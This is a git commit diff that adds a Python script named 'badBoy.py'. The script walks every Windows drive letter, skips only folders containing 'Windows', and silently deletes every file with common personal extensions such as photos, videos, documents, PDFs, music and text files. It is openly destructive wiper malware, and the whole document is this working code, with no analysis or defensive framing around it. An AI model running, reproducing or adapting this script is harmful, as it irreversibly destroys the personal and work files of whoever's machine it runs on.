9a1b94bce3ea9280c6a8c6dafb4f9c9a5430d8ca
sidq-corp <57019287+sidq-corp@users.noreply.github.com>
2020-03-14 23:46:36 +0200

    Add files via upload

---
+++ badBoy.py
@@ -0,0 +1,31 @@
+import os
+import glob
+
+disk = ['A:/', 'E:/', 'I:/', 'O:/', 'U:/', 'Y:/', 
+		'B:/', 'D:/', 'F:/', 'G:/', 'H:/', 'J:/', 
+		'K:/', 'L:/', 'M:/', 'N:/', 'P:/', 'Q:/', 
+		'R:/', 'S:/', 'T:/', 'V:/', 'W:/', 'X:/',
+	    'Y:/', 'Z:/', 'C:/']
+
+ras = ['.png', '.jpg', '.jpeg', '.tif', '.tiff',
+	   '.gif', '.bmp', '.heic', '.mp4', '.avi',
+	   '.mov', '.mpeg', '.avi', '.wmv', '.mpg', 
+	   '.py', '.txt', '.doc', '.docx', '.pdf',
+	   '.mp3']
+# ras = ['.ertyvubinoppoiytre']
+
+s = []
+for j in disk:
+	t = os.walk(j)
+	for i in t:
+		if not j + 'Windows' in i[0]:
+			s.append(i[0])
+
+for i in s:
+	try:
+		os.chdir(i)
+		for j in ras:
+			for file in glob.glob("*"+j):
+				os.remove(file)
+	except:
+		pass
